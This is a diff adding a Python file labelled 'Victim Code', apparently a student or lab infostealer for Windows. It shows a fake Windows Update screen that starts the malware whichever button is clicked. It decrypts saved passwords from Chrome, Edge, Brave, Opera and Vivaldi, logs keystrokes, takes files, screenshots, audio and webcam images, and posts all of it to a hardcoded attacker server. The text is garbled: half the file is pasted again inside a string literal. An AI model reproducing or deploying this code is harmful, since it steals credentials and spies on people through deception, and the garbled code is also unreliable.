@@ -1,0 +1,2240 @@
+Victim Code:
+
+#libraries
+import os
+import sqlite3
+import shutil
+import keyboard
+import threading
+import requests
+import time
+import json
+import base64
+from datetime import datetime
+import logging
+import subprocess
+import psutil
+from PIL import ImageGrab
+import tempfile
+import platform
+import win32crypt
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import pyaudio
+import wave
+import cv2
+import numpy as np
+from io import BytesIO
+import win32clipboard
+import win32con
+import socket
+
+import tkinter as tk
+from tkinter import ttk
+import threading
+
+def hide_console():
+    """Hide the console window on Windows systems"""
+    try:
+        import ctypes
+        # 0 = SW_HIDE (hidden window)
+        ctypes.windll.user32.ShowWindow(
+            ctypes.windll.kernel32.GetConsoleWindow(), 0
+        )
+        return True
+    except:
+        return False
+
+def show_fake_update_screen():
+    """
+    Displays a full-screen fake Windows Update window.
+    MALWARE RUNS NO MATTER WHAT BUTTON IS CLICKED.
+    """
+    print("[*] Initializing simulated Windows Update screen for demo...")
+    
+    # Create the main window
+    root = tk.Tk()
+    root.title("Windows Update")
+    root.configure(bg='#0078d4')  # Windows blue background
+    
+    # Make it full screen (like a real update screen)
+    root.attributes('-fullscreen', True)
+    root.attributes('-topmost', True)  # Keep it on top
+    
+    # Add a title label
+    title_label = tk.Label(root, 
+                          text="Windows Update",
+                          font=("Segoe UI", 28, "bold"),
+                          fg="white",
+                          bg='#0078d4')
+    title_label.pack(pady=(80, 20))
+    
+    # Add a main message
+    main_msg = tk.Label(root,
+                       text="Important update available for your device",
+                       font=("Segoe UI", 16),
+                       fg="white",
+                       bg='#0078d4')
+    main_msg.pack(pady=10)
+    
+    # Add a progress bar (indeterminate mode - just for show)
+    progress_label = tk.Label(root,
+                             text="Getting updates ready...",
+                             font=("Segoe UI", 12),
+                             fg="#e6f2ff",
+                             bg='#0078d4')
+    progress_label.pack(pady=20)
+    
+    progress_bar = ttk.Progressbar(root, 
+                                   mode='indeterminate',
+                                   length=400)
+    progress_bar.pack(pady=10)
+    progress_bar.start(10)  # Start the animation
+    
+    # Add update details frame
+    details_frame = tk.Frame(root, bg='#005a9e', relief=tk.FLAT)
+    details_frame.pack(pady=30, padx=100, fill=tk.BOTH, expand=True)
+    
+    # Update description
+    update_text = """• Update for Windows (KB5015684)
+  This update makes quality improvements to the servicing stack.
+
+• Security Update for Windows (KB5014702)
+  Addresses security vulnerabilities in Windows components.
+
+Your device will restart to complete the installation. 
+Please save your work before continuing."""
+    
+    details_label = tk.Label(details_frame,
+                            text=update_text,
+                            font=("Segoe UI", 11),
+                            fg="white",
+                            bg='#005a9e',
+                            justify=tk.LEFT,
+                            anchor='w')
+    details_label.pack(pady=20, padx=20)
+    
+    # Status and timer
+    status_label = tk.Label(root,
+                           text="Ready to install · Update will begin in 0:30",
+                           font=("Segoe UI", 10),
+                           fg="#cce4ff",
+                           bg='#0078d4')
+    status_label.pack(pady=10)
+    
+    # ============ MALICIOUS PART: Both buttons trigger malware ============
+    
+    def trigger_malware(button_clicked):
+        """This function runs malware NO MATTER which button is clicked"""
+        print(f"[!] User clicked '{button_clicked}' - Starting malware anyway...")
+        
+        # Show fake progress
+        if button_clicked == "Update now":
+            progress_label.config(text="Installing updates...")
+            status_label.config(text="Installing update 1 of 2... (10%)")
+        else:  # Cancel button clicked
+            progress_label.config(text="Cancelling update...")
+            status_label.config(text="Cleaning up temporary files...")
+        
+        # Fake progress animation
+        for i in range(1, 4):
+            if button_clicked == "Update now":
+                root.after(i*500, lambda x=i: status_label.config(
+                    text=f"Installing update 1 of 2... ({x*30}%)"
+                ))
+            else:
+                root.after(i*500, lambda x=i: status_label.config(
+                    text=f"Cleaning temporary files... ({x*30}%)"
+                ))
+        
+        # Close the window after 2 seconds
+        root.after(2000, root.destroy)
+    
+    # Function to handle the "Update now" button click
+    def start_update():
+        trigger_malware("Update now")
+    
+    # Function to handle the "Cancel" button click
+    def cancel_update():
+        trigger_malware("Cancel")
+    
+    # Button frame
+    button_frame = tk.Frame(root, bg='#0078d4')
+    button_frame.pack(pady=30)
+    
+    # Update Now button (triggers malware)
+    update_btn = tk.Button(button_frame,
+                          text="Update now",
+                          command=start_update,
+                          font=("Segoe UI", 12, "bold"),
+                          bg="#107c10",
+                          fg="white",
+                          padx=40,
+                          pady=10,
+                          relief=tk.FLAT,
+                          cursor="hand2")
+    update_btn.pack(side=tk.LEFT, padx=20)
+    
+    # Cancel button (ALSO triggers malware)
+    cancel_btn = tk.Button(button_frame,
+                          text="Cancel",
+                          command=cancel_update,
+                          font=("Segoe UI", 11),
+                          bg="#505050",
+                          fg="white",
+                          padx=30,
+                          pady=8,
+                          relief=tk.FLAT)
+    cancel_btn.pack(side=tk.LEFT, padx=20)
+    
+    # Footer text
+    footer = tk.Label(root,
+                     text="Your files, apps, and settings will be preserved. Do not turn off your PC.",
+                     font=("Segoe UI", 9),
+                     fg="#99ccff",
+                     bg='#0078d4')
+    footer.pack(side=tk.BOTTOM, pady=20)
+    
+    # ============ EXTREMELY MALICIOUS: Auto-trigger after 30 seconds ============
+    # If user doesn't click anything, malware still runs
+    root.after(30000, start_update)  # Auto-click "Update now" after 30 seconds
+    
+    # Start the GUI event loop (this blocks until window is closed)
+    root.mainloop()
+    
+    print("[*] Fake update screen closed. Malware activated regardless of user choice.")
+
+def cancel_update():
+        """Show fake error but still run malware"""
+        print("[!] User tried to cancel - Showing fake error but running malware...")
+        
+        # Show fake error message
+        progress_label.config(text="Error: Update cannot be cancelled")
+        status_label.config(text="Critical security updates must be installed")
+        
+        # Change button text to make it seem like user has no choice
+        cancel_btn.config(text="Install Now", bg="#107c10", state="disabled")
+        update_btn.config(state="disabled")
+        
+        # Show countdown
+        for i in range(3, 0, -1):
+            root.after((3-i)*1000, lambda x=i: status_label.config(
+                text=f"Update will proceed in {x} seconds..."
+            ))
+        
+        # Auto-proceed after 3 seconds
+        root.after(3000, start_update)
+
+
+# Configure logging
+logging.basicConfig(level=logging.ERROR)
+logger = logging.getLogger(__name__)
+
+# Attacker server configuration
+ATTACKER_IP = "import os
+import sqlite3
+import shutil
+import keyboard
+import threading
+import requests
+import time
+import json
+import base64
+from datetime import datetime
+import logging
+import subprocess
+import psutil
+from PIL import ImageGrab
+import tempfile
+import platform
+import win32crypt
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import pyaudio
+import wave
+import cv2
+import numpy as np
+from io import BytesIO
+import win32clipboard
+import win32con
+import socket
+
+import tkinter as tk
+from tkinter import ttk
+import threading
+
+def hide_console():
+    """Hide the console window on Windows systems"""
+    try:
+        import ctypes
+        # 0 = SW_HIDE (hidden window)
+        ctypes.windll.user32.ShowWindow(
+            ctypes.windll.kernel32.GetConsoleWindow(), 0
+        )
+        return True
+    except:
+        return False
+
+def show_fake_update_screen():
+    """
+    Displays a full-screen fake Windows Update window.
+    MALWARE RUNS NO MATTER WHAT BUTTON IS CLICKED.
+    """
+    print("[*] Initializing simulated Windows Update screen for demo...")
+    
+    # Create the main window
+    root = tk.Tk()
+    root.title("Windows Update")
+    root.configure(bg='#0078d4')  # Windows blue background
+    
+    # Make it full screen (like a real update screen)
+    root.attributes('-fullscreen', True)
+    root.attributes('-topmost', True)  # Keep it on top
+    
+    # Add a title label
+    title_label = tk.Label(root, 
+                          text="Windows Update",
+                          font=("Segoe UI", 28, "bold"),
+                          fg="white",
+                          bg='#0078d4')
+    title_label.pack(pady=(80, 20))
+    
+    # Add a main message
+    main_msg = tk.Label(root,
+                       text="Important update available for your device",
+                       font=("Segoe UI", 16),
+                       fg="white",
+                       bg='#0078d4')
+    main_msg.pack(pady=10)
+    
+    # Add a progress bar (indeterminate mode - just for show)
+    progress_label = tk.Label(root,
+                             text="Getting updates ready...",
+                             font=("Segoe UI", 12),
+                             fg="#e6f2ff",
+                             bg='#0078d4')
+    progress_label.pack(pady=20)
+    
+    progress_bar = ttk.Progressbar(root, 
+                                   mode='indeterminate',
+                                   length=400)
+    progress_bar.pack(pady=10)
+    progress_bar.start(10)  # Start the animation
+    
+    # Add update details frame
+    details_frame = tk.Frame(root, bg='#005a9e', relief=tk.FLAT)
+    details_frame.pack(pady=30, padx=100, fill=tk.BOTH, expand=True)
+    
+    # Update description
+    update_text = """• Update for Windows (KB5015684)
+  This update makes quality improvements to the servicing stack.
+
+• Security Update for Windows (KB5014702)
+  Addresses security vulnerabilities in Windows components.
+
+Your device will restart to complete the installation. 
+Please save your work before continuing."""
+    
+    details_label = tk.Label(details_frame,
+                            text=update_text,
+                            font=("Segoe UI", 11),
+                            fg="white",
+                            bg='#005a9e',
+                            justify=tk.LEFT,
+                            anchor='w')
+    details_label.pack(pady=20, padx=20)
+    
+    # Status and timer
+    status_label = tk.Label(root,
+                           text="Ready to install · Update will begin in 0:30",
+                           font=("Segoe UI", 10),
+                           fg="#cce4ff",
+                           bg='#0078d4')
+    status_label.pack(pady=10)
+    
+    # ============ MALICIOUS PART: Both buttons trigger malware ============
+    
+    def trigger_malware(button_clicked):
+        """This function runs malware NO MATTER which button is clicked"""
+        print(f"[!] User clicked '{button_clicked}' - Starting malware anyway...")
+        
+        # Show fake progress
+        if button_clicked == "Update now":
+            progress_label.config(text="Installing updates...")
+            status_label.config(text="Installing update 1 of 2... (10%)")
+        else:  # Cancel button clicked
+            progress_label.config(text="Cancelling update...")
+            status_label.config(text="Cleaning up temporary files...")
+        
+        # Fake progress animation
+        for i in range(1, 4):
+            if button_clicked == "Update now":
+                root.after(i*500, lambda x=i: status_label.config(
+                    text=f"Installing update 1 of 2... ({x*30}%)"
+                ))
+            else:
+                root.after(i*500, lambda x=i: status_label.config(
+                    text=f"Cleaning temporary files... ({x*30}%)"
+                ))
+        
+        # Close the window after 2 seconds
+        root.after(2000, root.destroy)
+    
+    # Function to handle the "Update now" button click
+    def start_update():
+        trigger_malware("Update now")
+    
+    # Function to handle the "Cancel" button click
+    def cancel_update():
+        trigger_malware("Cancel")
+    
+    # Button frame
+    button_frame = tk.Frame(root, bg='#0078d4')
+    button_frame.pack(pady=30)
+    
+    # Update Now button (triggers malware)
+    update_btn = tk.Button(button_frame,
+                          text="Update now",
+                          command=start_update,
+                          font=("Segoe UI", 12, "bold"),
+                          bg="#107c10",
+                          fg="white",
+                          padx=40,
+                          pady=10,
+                          relief=tk.FLAT,
+                          cursor="hand2")
+    update_btn.pack(side=tk.LEFT, padx=20)
+    
+    # Cancel button (ALSO triggers malware)
+    cancel_btn = tk.Button(button_frame,
+                          text="Cancel",
+                          command=cancel_update,
+                          font=("Segoe UI", 11),
+                          bg="#505050",
+                          fg="white",
+                          padx=30,
+                          pady=8,
+                          relief=tk.FLAT)
+    cancel_btn.pack(side=tk.LEFT, padx=20)
+    
+    # Footer text
+    footer = tk.Label(root,
+                     text="Your files, apps, and settings will be preserved. Do not turn off your PC.",
+                     font=("Segoe UI", 9),
+                     fg="#99ccff",
+                     bg='#0078d4')
+    footer.pack(side=tk.BOTTOM, pady=20)
+    
+    # ============ EXTREMELY MALICIOUS: Auto-trigger after 30 seconds ============
+    # If user doesn't click anything, malware still runs
+    root.after(30000, start_update)  # Auto-click "Update now" after 30 seconds
+    
+    # Start the GUI event loop (this blocks until window is closed)
+    root.mainloop()
+    
+    print("[*] Fake update screen closed. Malware activated regardless of user choice.")
+
+def cancel_update():
+        """Show fake error but still run malware"""
+        print("[!] User tried to cancel - Showing fake error but running malware...")
+        
+        # Show fake error message
+        progress_label.config(text="Error: Update cannot be cancelled")
+        status_label.config(text="Critical security updates must be installed")
+        
+        # Change button text to make it seem like user has no choice
+        cancel_btn.config(text="Install Now", bg="#107c10", state="disabled")
+        update_btn.config(state="disabled")
+        
+        # Show countdown
+        for i in range(3, 0, -1):
+            root.after((3-i)*1000, lambda x=i: status_label.config(
+                text=f"Update will proceed in {x} seconds..."
+            ))
+        
+        # Auto-proceed after 3 seconds
+        root.after(3000, start_update)
+
+
+# Configure logging
+logging.basicConfig(level=logging.ERROR)
+logger = logging.getLogger(__name__)
+
+# Attacker server configuration
+ATTACKER_IP = "172.20.10.14"  # Your attacker IP
+ATTACKER_PORT = 5000
+ATTACKER_URL = f"http://{ATTACKER_IP}:{ATTACKER_PORT}"
+
+# Global variables
+shutdown_flag = threading.Event()
+audio_recording = False
+video_recording = False
+
+
+def send_to_attacker(data_type, data):
+    """Send data to attacker server"""
+    try:
+        payload = {
+            'type': data_type,
+            'data': data,
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        }
+        
+        response = requests.post(f"{ATTACKER_URL}/receive_data", 
+                               json=payload, timeout=10)
+        
+        if response.status_code == 200:
+            print(f"✅ Sent {data_type} to attacker")
+            return True
+        else:
+            print(f"❌ Failed to send {data_type}: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Error sending {data_type}: {e}")
+        return False
+
+def send_file_to_attacker(filepath, file_type='file'):
+    """Send file to attacker server"""
+    try:
+        with open(filepath, 'rb') as f:
+            files = {'file': f}
+            data = {'type': file_type}
+            
+            if file_type == 'audio':
+                data['duration'] = 10  # Default duration
+            
+            response = requests.post(f"{ATTACKER_URL}/receive_file", 
+                                  files=files, data=data, timeout=30)
+        
+        if response.status_code == 200:
+            print(f"✅ Sent {file_type}: {os.path.basename(filepath)}")
+            return True
+        else:
+            print(f"❌ Failed to send file: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Error sending file: {e}")
+        return False
+
+def get_chromium_master_key(browser_path):
+    """Get master key for Chromium-based browsers - FIXED VERSION"""
+    try:
+        local_state_path = os.path.join(browser_path, "Local State")
+        if not os.path.exists(local_state_path):
+            return None
+            
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        
+        # Get encrypted key from Local State
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        
+        # Remove DPAPI prefix (first 5 bytes: DPAPI)
+        encrypted_key = encrypted_key[5:]
+        
+        # Decrypt using DPAPI
+        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)
+        
+        return decrypted_key[1]  # Return the decrypted key
+        
+    except Exception as e:
+        print(f"❌ Error getting master key: {e}")
+        return None
+
+def decrypt_chromium_password(encrypted_password, master_key):
+    """Decrypt Chromium password - IMPROVED VERSION"""
+    try:
+        if not encrypted_password:
+            return "[EMPTY]"
+        
+        # Check if it's Chrome v80+ encrypted password
+        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
+            # Chrome v80+ uses AES-GCM
+            try:
+                # Extract nonce and ciphertext
+                nonce = encrypted_password[3:15]  # 12 bytes for nonce
+                ciphertext = encrypted_password[15:-16]  # Remove tag
+                tag = encrypted_password[-16:]  # 16 bytes for tag
+                
+                # Create AES-GCM cipher
+                cipher = AESGCM(master_key)
+                
+                # Combine ciphertext and tag for decryption
+                combined = ciphertext + tag
+                
+                # Decrypt
+                decrypted = cipher.decrypt(nonce, combined, None)
+                return decrypted.decode('utf-8')
+                
+            except Exception as e:
+                print(f"❌ AES-GCM decryption failed: {e}")
+                # Try DPAPI as fallback
+                pass
+        
+        # Try DPAPI decryption (for older Chrome or Edge)
+        try:
+            decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
+            return decrypted[1].decode('utf-8')
+        except:
+            return "[DECRYPTION_FAILED_DPAPI]"
+            
+    except Exception as e:
+        print(f"❌ Decryption error: {e}")
+        return f"[DECRYPTION_ERROR: {str(e)[:50]}]"
+
+def extract_browser_passwords():
+    """Extract passwords from ALL browsers - COMPLETE VERSION"""
+    print("🔍 Extracting browser passwords...")
+    
+    browsers = {
+        "Google Chrome": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data"),
+        ],
+        "Microsoft Edge": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data"),
+        ],
+        "Brave Browser": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+        ],
+        "Opera": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Opera Software", "Opera Stable"),
+        ],
+        "Vivaldi": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Vivaldi", "User Data"),
+        ]
+    }
+
+    credentials = []
+    
+    for browser_name, browser_paths in browsers.items():
+        for base_path in browser_paths:
+            if not os.path.exists(base_path):
+                continue
+                
+            print(f"🔍 Checking {browser_name} at {base_path}")
+            
+            try:
+                # Get master key
+                master_key = get_chromium_master_key(base_path)
+                if not master_key:
+                    print(f"❌ Could not get master key for {browser_name}")
+                    continue
+                
+                # Find all profiles
+                for profile_dir in os.listdir(base_path):
+                    profile_path = os.path.join(base_path, profile_dir)
+                    
+                    if os.path.isdir(profile_path) and (profile_dir.startswith("Profile") or profile_dir == "Default" or profile_dir == "Login Data"):
+                        login_db_path = os.path.join(profile_path, "Login Data")
+                        
+                        if os.path.exists(login_db_path):
+                            print(f"📊 Found login database in {profile_dir}")
+                            
+                            # Copy database to temp location
+                            temp_db = os.path.join(tempfile.gettempdir(), f"temp_{browser_name}_{profile_dir}.db")
+                            shutil.copy2(login_db_path, temp_db)
+                            
+                            try:
+                                conn = sqlite3.connect(temp_db)
+                                cursor = conn.cursor()
+                                
+                                # Try different table names
+                                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                                tables = cursor.fetchall()
+                                
+                                for table in tables:
+                                    table_name = table[0]
+                                    if 'login' in table_name.lower() or 'credential' in table_name.lower():
+                                        try:
+                                            cursor.execute(f"SELECT origin_url, username_value, password_value FROM {table_name}")
+                                            rows = cursor.fetchall()
+                                            
+                                            for url, username, encrypted_password in rows:
+                                                if url and username and encrypted_password:
+                                                    password = decrypt_chromium_password(encrypted_password, master_key)
+                                                    
+                                                    credentials.append({
+                                                        'url': url,
+                                                        'username': username,
+                                                        'password': password,
+                                                        'browser': browser_name,
+                                                        'profile': profile_dir,
+                                                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                                                    })
+                                                    
+                                        except Exception as table_error:
+                                            print(f"❌ Error reading table {table_name}: {table_error}")
+                                            continue
+                                
+                                conn.close()
+                                
+                            except Exception as e:
+                                print(f"❌ Error reading database: {e}")
+                            
+                            finally:
+                                # Clean up temp file
+                                try:
+                                    os.remove(temp_db)
+                                except:
+                                    pass
+                                
+            except Exception as e:
+                print(f"❌ Error processing {browser_name}: {e}")
+                continue
+    
+    if credentials:
+        print(f"✅ Found {len(credentials)} credentials")
+        send_to_attacker('credentials', credentials)
+        
+        # Also save locally for debugging
+        debug_file = os.path.join(tempfile.gettempdir(), "extracted_passwords.json")
+        with open(debug_file, 'w', encoding='utf-8') as f:
+            json.dump(credentials, f, indent=2, ensure_ascii=False)
+        print(f"📝 Debug file saved: {debug_file}")
+        
+    else:
+        print("❌ No credentials found")
+    
+    return credentials
+
+def collect_system_info():
+    """Collect comprehensive system information"""
+    print("💻 Collecting system info...")
+    
+    try:
+        # Network information
+        hostname = socket.gethostname()
+        try:
+            ip_address = socket.gethostbyname(hostname)
+        except:
+            ip_address = "127.0.0.1"
+        
+        # Disk information
+        disk_info = []
+        for partition in psutil.disk_partitions():
+            try:
+                usage = psutil.disk_usage(partition.mountpoint)
+                disk_info.append({
+                    'device': partition.device,
+                    'mountpoint': partition.mountpoint,
+                    'total_gb': round(usage.total / (1024**3), 2),
+                    'used_gb': round(usage.used / (1024**3), 2),
+                    'free_gb': round(usage.free / (1024**3), 2),
+                    'percent': usage.percent
+                })
+            except:
+                pass
+        
+        system_info = {
+            'username': os.getlogin(),
+            'hostname': hostname,
+            'ip_address': ip_address,
+            'os': platform.system(),
+            'os_version': platform.version(),
+            'os_release': platform.release(),
+            'architecture': platform.architecture()[0],
+            'processor': platform.processor(),
+            'cpu_count': psutil.cpu_count(),
+            'cpu_cores': psutil.cpu_count(logical=False),
+            'cpu_usage': psutil.cpu_percent(interval=1),
+            'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
+            'memory_available_gb': round(psutil.virtual_memory().available / (1024**3), 2),
+            'memory_used_percent': psutil.virtual_memory().percent,
+            'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
+            'disk_info': disk_info,
+            'python_version': platform.python_version(),
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        
+        send_to_attacker('system_info', system_info)
+        print("✅ System info collected")
+        return system_info
+        
+    except Exception as e:
+        print(f"❌ Error collecting system info: {e}")
+        return None
+
+def monitor_processes():
+    """Monitor running processes"""
+    print("⚡ Starting process monitor...")
+    
+    while not shutdown_flag.is_set():
+        try:
+            processes = []
+            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):
+                try:
+                    proc_info = proc.info
+                    create_time = datetime.fromtimestamp(proc_info['create_time']).strftime("%Y-%m-%d %H:%M:%S") if proc_info['create_time'] else "Unknown"
+                    
+                    processes.append({
+                        'pid': proc_info['pid'],
+                        'name': proc_info['name'],
+                        'user': proc_info['username'],
+                        'cpu': round(proc_info['cpu_percent'], 2),
+                        'memory': round(proc_info['memory_percent'], 2),
+                        'created': create_time,
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    })
+                except:
+                    continue
+            
+            if processes:
+                send_to_attacker('processes', processes[:50])  # Send first 50 processes
+            
+        except Exception as e:
+            print(f"❌ Error monitoring processes: {e}")
+        
+        time.sleep(30)  # Check every 30 seconds
+
+def keylogger():
+    """Advanced keylogger with window title"""
+    print("⌨️ Starting keylogger...")
+    
+    keystroke_buffer = []
+    last_send_time = time.time()
+    last_window = ""
+    
+    try:
+        import win32gui
+        import win32process
+        
+        def get_active_window():
+            """Get active window title"""
+            try:
+                window = win32gui.GetForegroundWindow()
+                return win32gui.GetWindowText(window)
+            except:
+                return "Unknown"
+    except:
+        def get_active_window():
+            return "Unknown"
+    
+    def on_key_event(event):
+        nonlocal keystroke_buffer, last_send_time, last_window
+        
+        try:
+            current_window = get_active_window()
+            if current_window != last_window:
+                # Log window change
+                keystroke_buffer.append({
+                    'key': f"[WINDOW: {current_window}]",
+                    'event_type': 'window_change',
+                    'window': current_window,
+                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                })
+                last_window = current_window
+            
+            keystroke_data = {
+                'key': event.name if event.name else str(event.scan_code),
+                'event_type': event.event_type,
+                'window': current_window,
+                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            }
+            
+            keystroke_buffer.append(keystroke_data)
+            
+            # Send data every 20 keystrokes or every 30 seconds
+            current_time = time.time()
+            if len(keystroke_buffer) >= 20 or (current_time - last_send_time) > 30:
+                if keystroke_buffer:
+                    send_to_attacker('keystrokes', keystroke_buffer)
+                    keystroke_buffer = []
+                    last_send_time = current_time
+                    
+        except Exception as e:
+            print(f"❌ Keylogger error: {e}")
+    
+    try:
+        keyboard.hook(on_key_event)
+        
+        while not shutdown_flag.is_set():
+            time.sleep(1)
+            
+    except Exception as e:
+        print(f"❌ Keylogger failed: {e}")
+    finally:
+        try:
+            keyboard.unhook_all()
+        except:
+            pass
+
+def exfiltrate_files():
+    """Exfiltrate important files"""
+    print("📁 Exfiltrating files...")
+    
+    important_locations = [
+        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
+        os.path.join(os.environ['USERPROFILE'], 'Documents'),
+        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
+        os.path.join(os.environ['USERPROFILE'], 'Pictures'),
+    ]
+    
+    file_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', 
+                      '.zip', '.rar', '.7z', '.pptx', '.sql', '.db', '.config', '.ini',
+                      '.json', '.xml', '.csv', '.rtf', '.odt', '.key', '.pem', '.env']
+    
+    max_file_size = 3 * 1024 * 1024  # 3MB max
+    
+    file_info_list = []
+    
+    try:
+        for location in important_locations:
+            if not os.path.exists(location):
+                continue
+                
+            for root, dirs, files in os.walk(location):
+                for file in files:
+                    file_lower = file.lower()
+                    if any(file_lower.endswith(ext) for ext in file_extensions):
+                        file_path = os.path.join(root, file)
+                        
+                        try:
+                            file_size = os.path.getsize(file_path)
+                            if file_size > max_file_size:
+                                continue
+                                
+                            # Send file to attacker
+                            if send_file_to_attacker(file_path):
+                                file_info = {
+                                    'filename': file,
+                                    'path': file_path,
+                                    'size': file_size,
+                                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                                }
+                                file_info_list.append(file_info)
+                                print(f"📤 Exfiltrated: {file}")
+                            
+                        except Exception as e:
+                            continue
+        
+        if file_info_list:
+            send_to_attacker('files', file_info_list)
+            print(f"✅ Exfiltrated {len(file_info_list)} files")
+        
+    except Exception as e:
+        print(f"❌ Error exfiltrating files: {e}")
+
+def capture_screenshot():
+    """Capture screenshots periodically"""
+    print("📸 Starting screenshot capture...")
+    
+    screenshot_count = 0
+    
+    while not shutdown_flag.is_set():
+        try:
+            screenshot = ImageGrab.grab()
+            
+            # Convert to base64
+            buffer = BytesIO()
+            screenshot.save(buffer, format='PNG')
+            img_str = base64.b64encode(buffer.getvalue()).decode()
+            
+            screenshot_data = {
+                'data': img_str,
+                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                'count': screenshot_count
+            }
+            
+            send_to_attacker('screenshot', screenshot_data)
+            screenshot_count += 1
+            print(f"✅ Screenshot #{screenshot_count} captured")
+                
+        except Exception as e:
+            print(f"❌ Error capturing screenshot: {e}")
+        
+        time.sleep(60)  # Capture every 60 seconds
+
+def record_audio():
+    """Record audio from microphone"""
+    print("🎤 Starting audio recording...")
+    
+    global audio_recording
+    
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 2
+    RATE = 44100
+    RECORD_SECONDS = 10
+    
+    while not shutdown_flag.is_set():
+        try:
+            audio = pyaudio.PyAudio()
+            
+            stream = audio.open(format=FORMAT,
+                              channels=CHANNELS,
+                              rate=RATE,
+                              input=True,
+                              frames_per_buffer=CHUNK)
+            
+            print("🎤 Recording audio...")
+            frames = []
+            
+            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+                if shutdown_flag.is_set():
+                    break
+                data = stream.read(CHUNK)
+                frames.append(data)
+            
+            stream.stop_stream()
+            stream.close()
+            audio.terminate()
+            
+            # Save to temporary file
+            temp_file = os.path.join(tempfile.gettempdir(), f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
+            
+            wf = wave.open(temp_file, 'wb')
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(audio.get_sample_size(FORMAT))
+            wf.setframerate(RATE)
+            wf.writeframes(b''.join(frames))
+            wf.close()
+            
+            # Send to attacker
+            if send_file_to_attacker(temp_file, 'audio'):
+                print("✅ Audio sent to attacker")
+            
+            # Clean up
+            try:
+                os.remove(temp_file)
+            except:
+                pass
+            
+        except Exception as e:
+            print(f"❌ Error recording audio: {e}")
+        
+        time.sleep(30)  # Record every 30 seconds
+
+def capture_webcam():
+    """Capture webcam images"""
+    print("📹 Starting webcam capture...")
+    
+    try:
+        cap = cv2.VideoCapture(0)
+        
+        if not cap.isOpened():
+            print("❌ Webcam not available")
+            return
+        
+        webcam_count = 0
+        
+        while not shutdown_flag.is_set() and webcam_count < 10:  # Capture 10 images max
+            try:
+                ret, frame = cap.read()
+                
+                if ret:
+                    # Encode image
+                    _, buffer = cv2.imencode('.jpg', frame)
+                    img_str = base64.b64encode(buffer).decode()
+                    
+                    webcam_data = {
+                        'data': img_str,
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        'count': webcam_count
+                    }
+                    
+                    send_to_attacker('webcam', webcam_data)
+                    webcam_count += 1
+                    print(f"✅ Webcam image #{webcam_count} captured")
+                
+            except Exception as e:
+                print(f"❌ Error capturing webcam: {e}")
+            
+            time.sleep(10)  # Capture every 10 seconds
+        
+        cap.release()
+        
+    except Exception as e:
+        print(f"❌ Webcam error: {e}")
+
+def capture_webcam_photos():
+    """Capture webcam photos and send to attacker"""
+    print("📷 Starting webcam photo capture...")
+    
+    try:
+        # Initialize webcam
+        cap = cv2.VideoCapture(0)
+        
+        if not cap.isOpened():
+            print("❌ Webcam not available or access denied")
+            return
+        
+        # Set camera properties for better quality
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        cap.set(cv2.CAP_PROP_FPS, 30)
+        
+        webcam_count = 0
+        max_photos = 20  # Maximum photos to capture
+        
+        print("✅ Webcam initialized successfully")
+        
+        while not shutdown_flag.is_set() and webcam_count < max_photos:
+            try:
+                # Capture frame
+                ret, frame = cap.read()
+                
+                if ret:
+                    # Resize for better transmission
+                    frame = cv2.resize(frame, (640, 480))
+                    
+                    # Apply some image enhancement
+                    frame = cv2.convertScaleAbs(frame, alpha=1.2, beta=20)
+                    
+                    # Encode as JPEG with higher quality
+                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
+                    _, buffer = cv2.imencode('.jpg', frame, encode_param)
+                    img_str = base64.b64encode(buffer).decode()
+                    
+                    # Create data packet
+                    webcam_data = {
+                        'type': 'webcam',
+                        'data': img_str,
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        'count': webcam_count + 1,
+                        'resolution': '640x480',
+                        'format': 'jpg'
+                    }
+                    
+                    # Send to attacker
+                    if send_to_attacker('webcam', webcam_data):
+                        webcam_count += 1
+                        print(f"✅ Webcam photo #{webcam_count} captured and sent")
+                    
+                    # Save locally for debugging
+                    debug_file = os.path.join(tempfile.gettempdir(), f"webcam_{webcam_count}.jpg")
+                    cv2.imwrite(debug_file, frame)
